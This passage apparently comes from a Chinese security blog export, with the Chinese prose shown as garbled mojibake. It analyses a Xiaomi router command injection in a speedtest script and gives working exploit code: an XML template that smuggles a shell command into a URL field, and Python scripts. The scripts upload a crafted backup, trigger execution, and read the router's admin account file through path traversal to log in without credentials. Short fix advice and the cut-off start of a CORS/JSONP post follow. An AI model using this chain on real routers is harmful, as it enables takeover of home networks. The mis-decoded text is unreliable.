/usr/bin/upload_speedtestï¼Œ/usr/bin/download_speedtestç­‰ä¼šè¯»å–/tmp/speedtest_urls.xmlå¹¶æå–urlç›´æ¥è¿›è¡Œå‘½ä»¤æ‹¼æ¥ï¼Œä¸”è¿™å‡ ä¸ªè„šæœ¬å¯ä»¥é€šè¿‡webæ¥å£è°ƒç”¨ ä¸¾ä¾‹ï¼ŒæŸ¥çœ‹/usr/bin/download_speedtestæ–‡ä»¶ #!/usr/bin/env lua-- ...local cfg = &#123;-- ... [&#x27;xmlfile&#x27;] = &quot;/usr/share/speedtest.xml&quot;, [&#x27;tmp_speedtest_xml&#x27;] = &quot;/tmp/speedtest_urls.xml&quot;,&#125;VERSION=&quot;__UNDEFINED__&quot;-- ...-- æµ‹è¯•ç½‘é€Ÿä½¿ç”¨çš„urlæ–‡ä»¶ä¸ºï¼Œè‹¥å­˜åœ¨/tmp/speedtest_urls.xmlåˆ™ä½¿ç”¨ï¼Œå¦åˆ™ç”¨/usr/share/speedtest.xmllocal filename = &quot;&quot;filexml = io.open(cfg.tmp_speedtest_xml)if filexml then filexml:close() filename = cfg.tmp_speedtest_xmlelse filename = cfg.xmlfileendlocal pp = io.open(filename)local line = pp:read(&quot;*line&quot;)local size = 0local resources = &#123;&#125;local u = &quot;&quot;local pids = &#123;&#125;-- ...function wget_work(url) local _url = url pid = posix.fork() if pid &lt; 0 then print(&quot;fork error&quot;) return -1 elseif pid &gt; 0 then --print(string.format(&quot;child pid %d\\n&quot;, pid)) else -- æ‹¼æ¥å‘½ä»¤ï¼Œæœ€ç»ˆåœ¨è¿™é‡Œæ‰§è¡Œ os.execute(&#x27;for i in $(seq &#x27;.. math.floor(cfg.nr/cfg.nc) ..&#x27;); do wget &#x27;.. url .. &quot; -q -O /dev/null; done&quot;) end return pidendwhile line do -- ä»æ–‡ä»¶ä¸­æå–urlï¼Œ è¿™é‡Œæå–æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ local _, _, url = string.find(line,&#x27;&lt;item url=&quot;(.*)&quot;/&gt;&#x27;) if url then table.insert(resources, url) end line = pp:read(&quot;*line&quot;)endpp:close()local urls = mrandom(1, table.getn(resources), cfg.nc)for k, v in ipairs(urls) do if VERSION == &quot;LESSMEM&quot; then local pid = wget_work_loop(resources[v]) else -- VERSION ä¸º __UNDEFINED__ï¼Œ urlç›´æ¥ä½œä¸ºå‚æ•° local pid = wget_work(resources[v]) end if(pid == 0) then os.exit(0) elseif(pid == -1) then done() endend è°ƒç”¨çš„åœ°æ–¹è²Œä¼¼æœ‰å¥½å‡ ä¸ªï¼Œå…¶ä¸­/usr/lib/lua/luci/controller/api/xqnetdetect.luaä¸­ function netspeed() local XQPreference = require(&quot;xiaoqiang.XQPreference&quot;) local XQNSTUtil = require(&quot;xiaoqiang.module.XQNetworkSpeedTest&quot;) local code = 0 local result = &#123;&#125; local history = LuciHttp.formvalue(&quot;history&quot;) if history then result[&quot;bandwidth&quot;] = tonumber(XQPreference.get(&quot;BANDWIDTH&quot;, 0, &quot;xiaoqiang&quot;)) result[&quot;download&quot;] = tonumber(string.format(&quot;%.2f&quot;, 128 * result.bandwidth)) result[&quot;bandwidth2&quot;] = tonumber(XQPreference.get(&quot;BANDWIDTH2&quot;, 0, &quot;xiaoqiang&quot;)) result[&quot;upload&quot;] = tonumber(string.format(&quot;%.2f&quot;, 128 * result.bandwidth2)) else os.execute(&quot;/etc/init.d/miqos stop&quot;) -- è¿™é‡Œè°ƒç”¨äº†downloadSpeedTest local download = XQNSTUtil.downloadSpeedTest() if download then result[&quot;download&quot;] = download result[&quot;bandwidth&quot;] = tonumber(string.format(&quot;%.2f&quot;, 8 * download/1024)) XQPreference.set(&quot;BANDWIDTH&quot;, tostring(result.bandwidth), &quot;xiaoqiang&quot;) else code = 1588 end if code ~= 0 then result[&quot;msg&quot;] = XQErrorUtil.getErrorMessage(code) end os.execute(&quot;/etc/init.d/miqos start&quot;) end result[&quot;code&quot;] = code LuciHttp.write_json(result)endfunction downloadSpeedTest() local speedtest = &quot;/usr/bin/download_speedtest&quot; local speed -- ç›´æ¥è°ƒç”¨shæ–‡ä»¶ for _, line in ipairs(LuciUtil.execl(speedtest)) do if not XQFunction.isStrNil(line) and line:match(&quot;^avg rx:&quot;) then speed = line:match(&quot;^avg rx:(%S+)&quot;) if speed then speed = tonumber(string.format(&quot;%.2f&quot;,speed/8)) end break end end return speedend æ‰€ä»¥ï¼Œæˆ‘ä»¬åªéœ€è¦æ„é€ æ¶æ„çš„speedtest_urls.xmlæ–‡ä»¶ï¼Œæ„é€ å¤‡ä»½æ–‡ä»¶ï¼Œä¸Šä¼ å¤‡ä»½æ–‡ä»¶ï¼Œç„¶åè°ƒç”¨ç½‘ç»œæµ‹è¯•ç›¸å…³çš„æ¥å£ï¼Œå³å¯ä»¥å®ç°å‘½ä»¤æ³¨å…¥ã€‚ å®ç°å‘½ä»¤æ‰§è¡Œpoc template.xmlæ–‡ä»¶ &lt;?xml version=&quot;1.0&quot;?&gt;&lt;root&gt; &lt;class type=&quot;1&quot;&gt; &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt; &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt; &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt; &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt; &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt; &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt; &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt; &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt; &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt; &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt; &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt; &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt; &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt; &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt; &lt;/class&gt; &lt;class type=&quot;2&quot;&gt; &lt;item url=&quot;http://192.168.31.1 -q -O /dev/null;&#123;command&#125;&gt;/tmp/1.txt; exit; wget http://192.168.31.1 &quot;/&gt; &lt;/class&gt; &lt;class type=&quot;3&quot;&gt; &lt;item uploadurl=&quot;http://www.taobao.com/&quot;/&gt; &lt;item uploadurl=&quot;http://www.so.com/&quot;/&gt; &lt;item uploadurl=&quot;http://www.qq.com/&quot;/&gt; &lt;item uploadurl=&quot;http://www.sohu.com/&quot;/&gt; &lt;item uploadurl=&quot;http://www.tudou.com/&quot;/&gt; &lt;item uploadurl=&quot;http://www.360doc.com/&quot;/&gt; &lt;item uploadurl=&quot;http://www.kankan.com/&quot;/&gt; &lt;item uploadurl=&quot;http://www.speedtest.cn/&quot;/&gt; &lt;/class&gt;&lt;/root&gt; remote_command_execution_vulnerability.py import osimport tarfileimport requests# proxies = &#123;&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;&#125;proxies = &#123;&#125;## get stokstok = input(&quot;stok: &quot;)## make config filecommand = input(&quot;command: &quot;)speed_test_filename = &quot;speedtest_urls.xml&quot;with open(&quot;template.xml&quot;,&quot;rt&quot;) as f: template = f.read()data = template.format(command=command)# print(data)with open(&quot;speedtest_urls.xml&quot;,&#x27;wt&#x27;) as f: f.write(data)with tarfile.open(&quot;payload.tar.gz&quot;, &quot;w:gz&quot;) as tar: # tar.add(&quot;cfg_backup.des&quot;) # tar.add(&quot;cfg_backup.mbu&quot;) tar.add(&quot;speedtest_urls.xml&quot;)## upload config fileprint(&quot;start uploading config file ...&quot;)r1 = requests.post(&quot;http://192.168.31.1/cgi-bin/luci/;stok=&#123;&#125;/api/misystem/c_upload&quot;.format(stok), files=&#123;&quot;image&quot;:open(&quot;payload.tar.gz&quot;,&#x27;rb&#x27;)&#125;, proxies=proxies)# print(r1.text)## exec download speed test, exec commandprint(&quot;start exec command...&quot;)r2 = requests.get(&quot;http://192.168.31.1/cgi-bin/luci/;stok=&#123;&#125;/api/xqnetdetect/netspeed&quot;.format(stok), proxies=proxies)# print(r2.text)## read result filer3 = requests.get(&quot;http://192.168.31.1/api-third-party/download/extdisks../tmp/1.txt&quot;, proxies=proxies)if r3.status_code == 200: print(&quot;success, vul&quot;) print(r3.text) ä¸‰ã€ç»“åˆäºŒè€…ï¼Œæ— éœ€ç™»å½•è¿œç¨‹å‘½ä»¤æ‰§è¡Œimport osimport reimport timeimport base64import randomimport hashlibimport requestsfrom Crypto.Cipher import AESimport tarfile# proxies = &#123;&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;&#125;proxies = &#123;&#125;def get_mac(): ## get mac r0 = requests.get(&quot;http://192.168.31.1/cgi-bin/luci/web&quot;, proxies=proxies) mac = re.findall(r&#x27;deviceId = \\&#x27;(.*?)\\&#x27;&#x27;, r0.text)[0] # print(mac) return macdef get_account_str(): ## read /etc/config/account r1 = requests.get(&quot;http://192.168.31.1/api-third-party/download/extdisks../etc/config/account&quot;, proxies=proxies) print(r1.text) account_str = re.findall(r&#x27;admin\\&#x27;? \\&#x27;(.*)\\&#x27;&#x27;, r1.text)[0] return account_strdef create_nonce(mac): type_ = 0 deviceId = mac time_ = int(time.time()) rand = random.randint(0, 10000) return &quot;%d_%s_%d_%d&quot; % (type_, deviceId, time_, rand)def calc_password(nonce, account_str): m = hashlib.sha1() m.update((nonce + account_str).encode(&#x27;utf-8&#x27;)) return m.hexdigest()mac = get_mac()account_str = get_account_str()## login, get stoknonce = create_nonce(mac)password = calc_password(nonce, account_str)data = &quot;username=admin&amp;password=&#123;password&#125;&amp;logtype=2&amp;nonce=&#123;nonce&#125;&quot;.format(password=password, nonce=nonce)r2 = requests.post(&quot;http://192.168.31.1/cgi-bin/luci/api/xqsystem/login&quot;, data=data, headers=&#123; &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;&#125;, proxies=proxies)# print(r2.text)stok = re.findall(r&#x27;&quot;token&quot;:&quot;(.*?)&quot;&#x27;, r2.text)[0]print(&quot;stok=&quot; + stok)## make config filecommand = input(&quot;command: &quot;)speed_test_filename = &quot;speedtest_urls.xml&quot;with open(&quot;template.xml&quot;, &quot;rt&quot;) as f: template = f.read()data = template.format(command=command)# print(data)with open(&quot;speedtest_urls.xml&quot;, &#x27;wt&#x27;) as f: f.write(data)with tarfile.open(&quot;payload.tar.gz&quot;, &quot;w:gz&quot;) as tar: # tar.add(&quot;cfg_backup.des&quot;) # tar.add(&quot;cfg_backup.mbu&quot;) tar.add(&quot;speedtest_urls.xml&quot;)## upload config fileprint(&quot;start uploading config file ...&quot;)r1 = requests.post(&quot;http://192.168.31.1/cgi-bin/luci/;stok=&#123;&#125;/api/misystem/c_upload&quot;.format(stok), files=&#123;&quot;image&quot;: open(&quot;payload.tar.gz&quot;, &#x27;rb&#x27;)&#125;, proxies=proxies)# print(r1.text)## exec download speed test, exec commandprint(&quot;start exec command...&quot;)r2 = requests.get(&quot;http://192.168.31.1/cgi-bin/luci/;stok=&#123;&#125;/api/xqnetdetect/netspeed&quot;.format(stok), proxies=proxies)# print(r2.text)## read result filer3 = requests.get(&quot;http://192.168.31.1/api-third-party/download/extdisks../tmp/1.txt&quot;, proxies=proxies)if r3.status_code == 200: print(&quot;success, vul&quot;) print(r3.text) ç»æµ‹è¯•ï¼Œåœ¨å°ç±³ç³»åˆ—è·¯ç”±å™¨ä¸­å­˜åœ¨è¯¥æ¼æ´ï¼Œå¦‚å°ç±³è·¯ç”±å™¨R3Gã€å°ç±³è·¯ç”±å™¨R3Aã€å°ç±³è·¯ç”±å™¨R4ç­‰ å››ã€ä¿®å¤æ–¹æ¡ˆ1ã€ä»»æ„æ–‡ä»¶è¯»å–å°†/etc/sysapihttpd/sysapihttpd.confä¸­çš„å½¢å¦‚ä»¥ä¸‹å½¢å¼ä¿®æ”¹ä¸º location /xxx &#123; alias /abc/;&#125; ä¿®æ”¹ä¸º location /xxx/ &#123; alias /abc/;&#125; 2ã€è¿œç¨‹å‘½ä»¤æ‰§è¡Œ å°†å¤‡ä»½æ–‡ä»¶æ ¼å¼ä¿®æ”¹ä¸ºç‰¹å®šæ ¼å¼ï¼Œç›´æ¥è¯»å–å¤‡ä»½æ–‡ä»¶å†…å®¹ï¼Œè€Œä¸éœ€ä½¿ç”¨è§£å‹ ä»speedtest_urls.xmlä¸­è¯»å–urlsæ—¶ï¼Œè¿›è¡Œå¿…è¦çš„è¿‡æ»¤ï¼Œé˜²æ­¢å‘½ä»¤æ³¨å…¥","categories":[{"name":"æ¼æ´åˆ†æ","slug":"æ¼æ´åˆ†æ","permalink":"https://wolke.cn/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"}],"tags":[{"name":"CVE","slug":"CVE","permalink":"https://wolke.cn/tags/CVE/"},{"name":"è·¯ç”±å™¨","slug":"è·¯ç”±å™¨","permalink":"https://wolke.cn/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/"}],"author":"w01ke"},{"title":"CORSè·¨åŸŸæ¼æ´ä¸JSONPåŠ«æŒ","slug":"CORSè·¨åŸŸæ¼æ´ä¸JSONPåŠ«æŒ","date":"2022-03-10T03:43:27.000Z","updated":"2022-04-19T04:58:37.875Z","comments":true,"path":"post/c8aa67d0.html","link":"","permalink":"https://wolke.cn/post/c8aa67d0.html","excerpt":"","text":"å‰å‡ å¤©é€›Bç«™åˆ·åˆ°ä¸ªè§†é¢‘ï¼ŒUPä¸»åˆ©ç”¨é…·æŸéŸ³ä¹è½¯ä»¶å­˜åœ¨JSONPåŠ«æŒæ¼æ´è·å–äº†éª—å­ç»‘å®šçš„æ‰‹æœºå·ï¼Œäºæ˜¯æˆ‘ä¾¿æœé›†äº†äº›ç½‘ä¸Šçš„èµ„æ–™å¯¹JSONPçš„ç›¸å…³çŸ¥è¯†ç‚¹è¿›è¡Œä¸€ä¸ªç³»ç»Ÿçš„å­¦ä¹ ï¼ŒåŸè§†é¢‘å¦‚ä¸‹ (function(){var player = new DPlayer({\"container\":document.getElementById(\"dplayer0\"),\"theme\":\"#da4e7f\",\"screenshot\":true,\"video\":{\"url\":\"/video/Av637198900.mp4\",\"pic\":\"https://moeplayer.b0.upaiyun.com/dplayer/hikarunara.png\"},\"danmaku\":{\"api\":\"https://dplayer.alone88.cn/v3/bilibili?cid=554223473\",\"token\":\"tokendemo\",\"addition\":[\"https://dplayer.alone88.cn/v3/bilibili?cid=554223473\"]}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})() ä¸€ã€å‰è¨€CORSå…¨ç§°ä¸ºCross-Origin Resource Sharingï¼Œå³è·¨åŸŸèµ„æºå…±äº«ï¼Œç”¨äºç»•è¿‡SOPï¼ˆåŒæºç­–ç•¥ï¼‰æ¥å®ç°è·¨åŸŸèµ„æºè®¿é—®çš„ä¸€ç§æŠ€æœ¯ã€‚è€ŒCORSæ¼æ´åˆ™æ˜¯åˆ©ç”¨CORSæŠ€æœ¯çªƒå–ç”¨æˆ·æ•æ„Ÿæ•°æ®ã€‚CORSéœ€è¦æµè§ˆå™¨å’ŒæœåŠ¡å™¨åŒæ—¶æ”¯æŒã€‚ç›®å‰ï¼Œæ‰€æœ‰æµè§ˆå™¨éƒ½æ”¯æŒè¯¥åŠŸèƒ½ï¼ŒIEæµè§ˆå™¨ä¸èƒ½ä½äºIE10ã€‚ æ•´ä¸ªCORSé€šä¿¡è¿‡ç¨‹ï¼Œéƒ½æ˜¯æµè§ˆå™¨è‡ªåŠ¨å®Œæˆï¼Œä¸éœ€è¦ç”¨æˆ·å‚ä¸ã€‚å¯¹äºå¼€å‘è€…æ¥è¯´ï¼ŒCORSé€šä¿¡ä¸åŒæºçš„AJAXé€šä¿¡æ²¡æœ‰å·®åˆ«ï¼Œä»£ç å®Œå…¨ä¸€æ ·ã€‚æµè§ˆå™¨ä¸€æ—¦å‘ç°AJAXè¯·æ±‚è·¨æºï¼Œå°±ä¼šè‡ªåŠ¨æ·»åŠ ä¸€äº›é™„åŠ çš„å¤´ä¿¡æ¯ï¼Œæœ‰æ—¶è¿˜ä¼šå¤šå‡ºä¸€æ¬¡é™„åŠ çš„è¯·æ±‚ï¼Œä½†ç”¨æˆ·ä¸ä¼šæœ‰æ„Ÿè§‰ã€‚ å› æ­¤ï¼Œå®ç°CORSé€šä¿¡çš„å…³é”®æ˜¯æœåŠ¡å™¨ã€‚åªè¦æœåŠ¡å™¨å®ç°äº†CORSæ¥å£ï¼Œå°±å¯ä»¥è·¨æºé€šä¿¡ã€‚ JSONPå…¨ç§°æ˜¯Json With Paddingï¼Œæ˜¯åŸºäºJSONæ ¼å¼çš„ä¸ºè§£å†³è·¨åŸŸè¯·æ±‚è€Œäº§ç”Ÿçš„è§£å†³å®ç°æ–¹æ¡ˆã€‚JSONPå®ç°çš„åŸºæœ¬åŸç†æ˜¯åˆ©ç”¨äº†HTMLé‡Œ&lt;script&gt;&lt;/scirpt&gt;å…ƒç´ æ ‡ç­¾ï¼Œè¿œç¨‹è°ƒç”¨JSONæ–‡ä»¶æ¥å®ç°æ•°æ®ä¼ é€’ã€‚å½“æŸç½‘ç«™é€šè¿‡JSONPçš„æ–¹å¼æ¥è·¨åŸŸï¼ˆä¸€èˆ¬ä¸ºå­åŸŸï¼‰ä¼ é€’ç”¨æˆ·è®¤è¯åçš„æ•æ„Ÿä¿¡æ¯æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„JSONPè°ƒç”¨é¡µé¢ï¼Œè¯±å¯¼è¢«æ”»å‡»è€…è®¿é—®æ¥è¾¾åˆ°æˆªå–ç”¨æˆ·æ•æ„Ÿä¿¡æ¯çš„ç›®çš„ã€‚ CORSæ¼æ´ã€JSONPåŠ«æŒå®é™…ä¸Šéƒ½å±äºCSRFè·¨ç«™è¯·æ±‚ä¼ªé€ æ¼æ´ï¼Œå°½ç®¡äºŒè€…å·²ç»å‡ºç°äº†å¾ˆå¤šå¹´ï¼Œä½†ç”±äºéƒ¨åˆ†å‚å•†å¯¹æ­¤ä¸å¤Ÿé‡è§†å¯¼è‡´å…¶ä»åœ¨ä¸æ–­å‘å±•å’Œæ‰©æ•£ã€‚ 1ã€åŒæºç­–ç•¥å¯¹ CORS çš„ä»‹ç»è¦ä»æµè§ˆå™¨çš„åŒæºç­–ç•¥å¼€å§‹è¯´èµ·ï¼ŒSOP å…¨ç§°ä¸º Same Origin Policyï¼Œå³åŒæºç­–ç•¥ã€‚è¯¥ç­–ç•¥æ˜¯æµè§ˆå™¨çš„ä¸€ä¸ªå®‰å…¨åŸºçŸ³ï¼ŒåŒæºç­–ç•¥è§„å®šï¼šä¸åŒåŸŸçš„å®¢æˆ·ç«¯è„šæœ¬åœ¨æ²¡æœ‰æ˜ç¡®æˆæƒçš„æƒ…å†µä¸‹ï¼Œä¸èƒ½è¯»å†™å¯¹æ–¹çš„èµ„æºã€‚ ç®€å•æ¥è¯´åŒæºç­–ç•¥å°±æ˜¯æµè§ˆå™¨ä¼šé˜»æ­¢ä¸€ä¸ªæºä¸å¦ä¸€ä¸ªæºçš„èµ„æºäº¤äº’ã€‚å¯ä»¥è¯•æƒ³ä¸€ä¸‹ï¼Œå¦‚æœæ²¡æœ‰åŒæºç­–ç•¥ï¼Œå½“ä½ è®¿é—®ä¸€ä¸ªæ­£å¸¸ç½‘ç«™çš„æ—¶å€™åˆæ— æ„é—´æ‰“å¼€äº†å¦ä¸€ä¸ªæ¶æ„ç½‘ç«™ï¼Œæ¶æ„ç½‘ç«™ä¼šä»ä½ åˆšåˆšè®¿é—®çš„æ­£å¸¸ç½‘ç«™ä¸Šçªƒå–ä½ å…¨éƒ¨çš„ä¿¡æ¯ã€‚æ‰€è°“åŒæºæ˜¯æŒ‡ åŸŸåï¼Œåè®®ï¼Œç«¯å£ç›¸åŒã€‚ 2ã€AJAXæŠ€æœ¯è·¨åŸŸé—®é¢˜æ˜¯é’ˆå¯¹ä½¿ç”¨ XMLHttpRequest æŠ€æœ¯æ„å»ºçš„å¤æ‚çš„ã€åŠ¨æ€çš„ç½‘é¡µçš„ç¼–ç¨‹å®è·µæŠ€æœ¯â€”â€” AJAX çš„ï¼ŒHTML æœ¬èº«æ²¡æœ‰è·¨åŸŸé—®é¢˜ã€‚ â€‹ AJAX å…¨ç§° Asynchronous JavaScript + XMLï¼Œå³å¼‚æ­¥ JavaScript å’Œ XMLã€‚AJAX æœ¬èº«ä¸æ˜¯ä¸€ç§æ–°æŠ€æœ¯ï¼Œè€Œæ˜¯ç”¨æ¥æè¿°ä¸€ç§ä½¿ç”¨ç°æœ‰æŠ€æœ¯é›†åˆ/æ ‡å‡†çš„æ–°æ–¹æ³•ï¼ŒåŒ…æ‹¬ï¼šHTML or XHTMLã€Cascading Style Sheetsã€JavaScriptã€The Document Object Modelã€XMLã€XSLT ä»¥åŠ XMLHttpRequest objectã€‚AJAX å…è®¸åªæ›´æ–°ä¸€ä¸ª HTML é¡µé¢çš„éƒ¨åˆ† DOMï¼Œè€Œæ— é¡»é‡æ–°åŠ è½½æ•´ä¸ªé¡µé¢ï¼Œ ç½‘é¡µåº”ç”¨èƒ½å¤Ÿå¿«é€Ÿåœ°å°†å¢é‡æ›´æ–°å‘ˆç°åœ¨ç”¨æˆ·ç•Œé¢ä¸Šï¼Œè€Œä¸éœ€è¦é‡æ–°åŠ è½½æ•´ä¸ªé¡µé¢ã€‚è¿™ä½¿å¾—ç¨‹åºèƒ½å¤Ÿæ›´å¿«åœ°å›åº”ç”¨æˆ·çš„æ“ä½œã€‚ ã€æ³¨æ„ã€‘å°½ç®¡Xåœ¨ Ajax ä¸­ä»£è¡¨ XMLï¼Œä½†ç”±äº JSON çš„è®¸å¤šä¼˜åŠ¿ï¼Œæ¯”å¦‚æ›´åŠ è½»é‡ä»¥åŠä½œä¸º Javascript çš„ä¸€éƒ¨åˆ†ï¼Œç›®å‰ JSON çš„ä½¿ç”¨æ¯” XML æ›´åŠ æ™®éã€‚JSON å’Œ XML éƒ½è¢«ç”¨äºåœ¨ Ajax æ¨¡å‹ä¸­æ‰“åŒ…ä¿¡æ¯ã€‚ å½“æˆ‘ä»¬ä½¿ç”¨ AJAX æŠ€æœ¯å‘é€ XMLHttpRequest è¯·æ±‚çš„æ—¶å€™ï¼Œå¦‚æœè¯·æ±‚çš„æ˜¯åˆ«çš„åŸŸ (ä¸»æœºåŸŸåã€ç«¯å£) ä¸åŒæ—¶ï¼Œé‚£ä¹ˆå°±ä¼šäº§ç”Ÿè·¨åŸŸé—®é¢˜(å—åŒæºç­–ç•¥å½±å“ï¼Œå®¢æˆ·ç«¯å°†æ— æ³•è·å–æœåŠ¡ç«¯è¿”å›çš„æ•°æ®ï¼Œé™¤éä½¿ç”¨ CORS è·¨åŸŸèµ„æºå…±äº«æŠ€æœ¯)ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼šè·¨åŸŸçš„é—®é¢˜æ˜¯å‘ç”Ÿåœ¨XMLHttpRequest è¯·æ±‚çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä¸æ˜¯ XMLHttpRequest è¯·æ±‚æ˜¯ä¸ä¼šæœ‰è·¨åŸŸé—®é¢˜çš„ã€‚ä¸¾ä¸ªå¾ˆç®€å•çš„ä¾‹å­ï¼šåœ¨ç¼–å†™ç½‘é¡µçš„æ—¶å€™ï¼Œ&lt;img src = www.xxxx.xxxx/ &gt;ï¼Œåœ¨ CORS è·¨åŸŸèµ„æºå…±äº«æŠ€æœ¯çš„ä½œç”¨ä¸‹ï¼ŒURL ä¸æ˜¯æœ¬åŸŸçš„è¿˜æ˜¯å¯ä»¥æ­£å¸¸è·å–è¯¥å›¾ç‰‡çš„ã€‚ äºŒã€CORSè·¨åŸŸSOP æµè§ˆå™¨åŒæºç­–ç•¥æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„ç­–ç•¥ï¼Œåœ¨ SOP è¢«æå‡ºä¹‹åï¼Œå¤§å®¶éƒ½é»˜é»˜åœ°éµå®ˆç€è¿™ä¸ªè§„å®šï¼Œä½†éšç€WEBåº”ç”¨çš„å‘å±•ï¼Œæœ‰äº›ç½‘ç«™ç”±äºè‡ªèº«ä¸šåŠ¡çš„éœ€æ±‚ï¼Œéœ€è¦å®ç°ä¸€äº›è·¨åŸŸçš„åŠŸèƒ½èƒ½å¤Ÿè®©ä¸åŒåŸŸçš„é¡µé¢ä¹‹é—´èƒ½å¤Ÿç›¸äº’è®¿é—®å„è‡ªé¡µé¢çš„å†…å®¹ã€‚å¸¸è§éœ€è¦è·¨åŸŸçš„ä¸šåŠ¡åœºæ™¯å¦‚ä¸‹ï¼š æ¯”å¦‚åç«¯å¼€å‘å®Œä¸€éƒ¨åˆ†ä¸šåŠ¡ä»£ç åï¼Œæä¾›æ¥å£ç»™å‰ç«¯ç”¨ï¼Œåœ¨å‰åç«¯åˆ†ç¦»çš„æ¨¡å¼ä¸‹ï¼Œå‰åç«¯çš„åŸŸåæ˜¯ä¸ä¸€è‡´çš„ï¼Œæ­¤æ—¶å°±ä¼šå‘ç”Ÿè·¨åŸŸè®¿é—®çš„é—®é¢˜ï¼› ç¨‹åºå‘˜åœ¨æœ¬åœ°åšå¼€å‘ï¼Œæœ¬åœ°çš„æ–‡ä»¶å¤¹å¹¶ä¸æ˜¯åœ¨ä¸€ä¸ªåŸŸä¸‹é¢ï¼Œå½“ä¸€ä¸ªæ–‡ä»¶éœ€è¦å‘é€ ajax è¯·æ±‚ï¼Œè¯·æ±‚å¦å¤–ä¸€ä¸ªé¡µé¢çš„å†…å®¹çš„æ—¶å€™ï¼Œå°±ä¼šè·¨åŸŸï¼› ç”µå•†ç½‘ç«™æƒ³é€šè¿‡ç”¨æˆ·æµè§ˆå™¨åŠ è½½ç¬¬ä¸‰æ–¹å¿«é€’ç½‘ç«™çš„ç‰©æµä¿¡æ¯ï¼› å­ç«™åŸŸåå¸Œæœ›è°ƒç”¨ä¸»ç«™åŸŸåçš„ç”¨æˆ·èµ„æ–™æ¥å£ï¼Œå¹¶å°†æ•°æ®æ˜¾ç¤ºå‡ºæ¥ã€‚ ä¸ºäº†å®ç°è¿™ä¸ªè·¨åŸŸéœ€æ±‚ï¼Œèªæ˜çš„ç¨‹åºå‘˜æƒ³åˆ°äº†ä¸€ç§ç¼–ç æŠ€æœ¯ JSONPï¼Œè¯¥æŠ€æœ¯åˆ©ç”¨ä»å®¢æˆ·ç«¯ä¼ å…¥çš„ json æ ¼å¼çš„è¿”å›å€¼ï¼Œåœ¨æœåŠ¡å™¨ç«¯è°ƒç”¨è¯¥æ¥å£å¤„äº‹å…ˆä»¥å®šä¹‰å‡½æ•°çš„æ–¹å¼å®šä¹‰å¥½ json æ ¼å¼é‡Œå‚æ•°å€¼ï¼Œå¹¶åŠ è½½ script æ ‡ç­¾è°ƒç”¨è¯¥å‡½æ•°å®ç°è·¨åŸŸã€‚ JSONP è™½ç„¶å¥½ï¼Œä½†å®ƒå¹¶éæ˜¯åœ¨åè®®å±‚é¢è§£å†³è·¨åŸŸé—®é¢˜ï¼Œæ‰€ä»¥å‡ºç°äº†å¾ˆå¤šå®‰å…¨é—®é¢˜ã€‚ â€‹ ä¸ºäº†èƒ½æ›´å®‰å…¨çš„è¿›è¡Œè·¨åŸŸèµ„æºè®¿é—®ï¼ŒCORS è¯ç”Ÿäº†ã€‚CORS æ˜¯ H5 æä¾›çš„ä¸€ç§æœºåˆ¶ï¼ŒWEB åº”ç”¨ç¨‹åºå¯ä»¥é€šè¿‡åœ¨ HTTP æŠ¥æ–‡ä¸­å¢åŠ ç‰¹å®šå­—æ®µæ¥å‘Šè¯‰æµè§ˆå™¨ï¼Œå“ªäº›ä¸åŒæ¥æºçš„æœåŠ¡å™¨æ˜¯æœ‰æƒè®¿é—®æœ¬ç«™èµ„æºã€‚ 1ã€è·¨åŸŸæµç¨‹æµè§ˆå™¨å°†CORSè¯·æ±‚åˆ†æˆä¸¤ç±»ï¼šç®€å•è¯·æ±‚ï¼ˆsimple requestï¼‰å’Œ éç®€å•è¯·æ±‚ï¼ˆnot-so-simple requestï¼‰ã€‚åªè¦åŒæ—¶æ»¡è¶³ä»¥ä¸‹ä¸¤ä¸ªæ¡ä»¶å°±å±äºç®€å•è¯·æ±‚å¦åˆ™å±äºéç®€å•è¯·æ±‚ï¼ˆä¸»è¦é€šè¿‡è¯·æ±‚æ–¹æ³•è¿›è¡Œåˆ¤æ–­ï¼‰ï¼š è¯·æ±‚æ–¹æ³•æ˜¯ä»¥ä¸‹ä¸‰ç§ä¹‹ä¸€ HEAD GET POST 